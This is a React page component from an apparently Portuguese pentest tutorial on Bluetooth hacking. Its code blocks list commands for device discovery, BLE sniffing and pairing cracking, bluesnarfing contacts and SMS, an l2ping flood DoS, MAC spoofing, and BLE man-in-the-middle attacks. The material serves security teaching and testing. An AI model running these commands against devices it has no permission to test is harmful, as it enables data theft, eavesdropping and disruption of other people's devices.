import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function WirelessBluetooth() {
  return (
    <PageContainer
      title="Bluetooth Hacking"
      subtitle="Ataques em Bluetooth: scanning, sniffing, exploitation e ferramentas para testes de segurança wireless."
      difficulty="avancado"
      timeToRead="15 min"
    >
      <h2>Bluetooth Security Testing</h2>
      <p>
        Bluetooth é amplamente usado em dispositivos IoT, fones, teclados, e smart locks.
        Vulnerabilidades em Bluetooth podem permitir interceptação de dados, negação de serviço
        e até execução remota de código.
      </p>

      <AlertBox type="warning" title="Hardware necessário">
        Ataques Bluetooth requerem adaptador Bluetooth compatível. Recomendado: adaptador USB
        com chipset CSR ou Broadcom que suporte modo monitor.
      </AlertBox>

      <h2>Scanning e Enumeração</h2>
      <CodeBlock
        title="Descobrir dispositivos Bluetooth"
        code={`# Verificar adaptador Bluetooth
hciconfig
hciconfig hci0 up

# Scan clássico (BR/EDR)
hcitool scan
# Mostra: MAC Address, Nome do dispositivo

# Scan de serviços
sdptool browse XX:XX:XX:XX:XX:XX
# Lista todos os serviços disponíveis

# Scan BLE (Bluetooth Low Energy)
hcitool lescan
# Dispositivos BLE: smartwatch, fitness, IoT

# Bluetoothctl (ferramenta interativa)
bluetoothctl
# > scan on
# > devices
# > info XX:XX:XX:XX:XX:XX
# > pair XX:XX:XX:XX:XX:XX

# Enum com spooftooph
sudo apt install spooftooph
spooftooph -i hci0 -s

# btscanner — scanner detalhado
sudo apt install btscanner
btscanner`}
      />

      <h2>Sniffing Bluetooth</h2>
      <CodeBlock
        title="Capturar tráfego Bluetooth"
        code={`# Wireshark com interface Bluetooth
wireshark -i bluetooth0

# Ubertooth One (hardware dedicado)
# Capturar pacotes BLE
ubertooth-btle -f -c capture.pcap

# Capturar seguindo um dispositivo
ubertooth-btle -t XX:XX:XX:XX:XX:XX

# BTLE sniffing com nRF Sniffer
# Requer: nRF52840 Dongle + Wireshark plugin

# Capturar teclado Bluetooth (keystroke sniffing)
# Se o dispositivo usa pairing fraco
# Possível interceptar teclas digitadas

# Crackle — quebrar BLE pairing
sudo apt install crackle
crackle -i capture.pcap -o decrypted.pcap`}
      />

      <h2>Ataques Bluetooth</h2>
      <CodeBlock
        title="Técnicas de ataque"
        code={`# BlueBorne — exploit RCE via Bluetooth
# CVE-2017-0781 a CVE-2017-0785
# Afeta Android, iOS, Windows, Linux (sem pairing!)
# Scanner:
pip install blueborne-scanner
blueborne-scanner XX:XX:XX:XX:XX:XX

# Bluejacking — enviar mensagens não solicitadas
# Via OBEX push
ussp-push XX:XX:XX:XX:XX:XX@channel message.txt

# Bluesnarfing — roubar dados
# Acesso não autorizado a contatos, SMS, calendário
bluesnarfer -b XX:XX:XX:XX:XX:XX -r 1-100

# DoS — Bluetooth Ping of Death
l2ping -i hci0 -s 600 -f XX:XX:XX:XX:XX:XX
# -s 600: tamanho grande do pacote
# -f: flood

# BLE exploitation com GATTacker
git clone https://github.com/securing/gattacker
cd gattacker && npm install
# MITM em dispositivos BLE

# Spoofing de MAC Bluetooth
bdaddr -i hci0 XX:XX:XX:XX:XX:XX
# Ou
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX`}
      />

      <h2>BLE (Bluetooth Low Energy)</h2>
      <CodeBlock
        title="Pentest BLE"
        code={`# gatttool — interagir com BLE
gatttool -b XX:XX:XX:XX:XX:XX -I
# > connect
# > primary           # Listar serviços
# > characteristics   # Listar características
# > char-read-hnd 0x0016  # Ler valor
# > char-write-req 0x0016 0100  # Escrever valor

# bettercap — BLE recon
sudo bettercap
# > ble.recon on
# > ble.show
# > ble.enum MAC
# > ble.write MAC UUID DATA

# Ferramentas de análise BLE
# nRF Connect (Android/iOS) — scanner BLE visual
# LightBlue (iOS) — explorar serviços BLE

# Ataques BLE comuns:
# 1. Replay — capturar e reenviar comandos
# 2. Jamming — interferir no sinal
# 3. MITM — interceptar comunicação
# 4. Brute force PIN — se pairing é fraco`}
      />
    </PageContainer>
  );
}
